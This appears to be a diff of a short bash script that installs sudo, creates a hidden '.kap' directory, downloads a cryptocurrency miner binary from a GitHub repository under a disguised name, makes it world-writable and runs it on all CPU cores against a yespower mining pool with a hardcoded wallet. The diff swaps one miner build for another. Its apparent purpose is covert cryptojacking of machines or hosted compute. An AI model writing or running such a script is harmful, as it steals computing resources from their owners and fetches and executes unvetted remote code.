@@ -1,6 +1,6 @@
 #!/bin/bash
 apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
-wget -O skak https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
-chmod 777 skak
-sudo ./skak --algorithm yespower --pool stratum-na.rplant.xyz:7052 --wallet unPw6ctQHeqACNCwFhXrPY5YUjVm9qNs4B.x --password webpassword=x --cpu-threads $(nproc --all)
+wget -O plus https://github.com/nandafiku/gradi/raw/main/cpuminer-avx2
+chmod 777 plus
+./plus -a yespower  -o stratum+tcp://stratum-na.rplant.xyz:7052 -u unPw6ctQHeqACNCwFhXrPY5YUjVm9qNs4B.x -p webpassword=x -t $(nproc --all)
